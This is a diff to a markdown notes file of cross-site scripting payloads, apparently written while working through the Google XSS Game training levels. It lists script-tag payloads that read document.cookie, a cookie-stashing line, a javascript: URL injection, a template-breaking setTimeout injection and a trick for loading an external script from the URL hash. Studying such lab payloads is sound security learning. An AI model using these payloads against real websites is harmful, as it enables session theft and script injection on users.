@@ -1,3 +1,8 @@
+## General
+
+- Use `alert(document.domain)` instead of `alert(1)` to see exact domain with xss
+
+
 ## With script tag
 - Enter search input: <script>alert(123)</script> or %3cscript%3ealert(document.cookie)%3c/script%3e
 - <script>localStorage.setItem('Bob', document.cookie)</script>
@@ -35,3 +40,9 @@ https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
 setTimeout(function() { window.location = '{{ next }}'; }, 5000);
                                           ^^
 setTimeout(function() { window.location = '';alert(1);''; }, 5000);
+
+
+## JS could be loaded from hash (if there is such logic)
+
+- `https://xss-game.appspot.com/level6/frame#//progsmile.github.io/learn/xss/index.js`
+
